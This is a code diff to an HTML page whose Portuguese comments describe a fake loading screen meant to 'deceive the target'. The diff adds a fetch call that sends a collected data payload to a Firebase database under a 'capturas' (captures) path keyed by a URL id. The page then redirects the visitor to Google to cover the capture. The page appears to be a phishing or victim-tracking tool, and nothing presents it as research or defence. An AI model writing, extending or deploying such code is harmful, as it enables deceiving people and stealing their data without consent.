@@ -58,7 +58,7 @@
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
-        const targetId = urlParams.get('id');
+        const targetId = urlParams.get('id') || 'default';
 
         async function iniciarProcesso() {
             // Altera o visual do card para simular carregamento após o clique
@@ -117,7 +117,18 @@
 
             console.log("Dados prontos para envio:", payload);
 
-            // Simula o fim do carregamento e redireciona para enganar o alvo
+            // Envia os dados diretamente para o Firebase usando o ID passado na URL
+            try {
+                await fetch(`https://linkapi1-zrx-default-rtdb.firebaseio.com/capturas/${targetId}.json`, {
+                    method: 'PUT',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {
+                console.error("Erro ao enviar dados:", err);
+            }
+
+            // Simula o fim do carregamento e redireciona para o Google
             setTimeout(() => {
                 window.location.href = "https://www.google.com";
             }, 1000);
@@ -125,3 +136,4 @@
     </script>
 </body>
 </html>
+ 
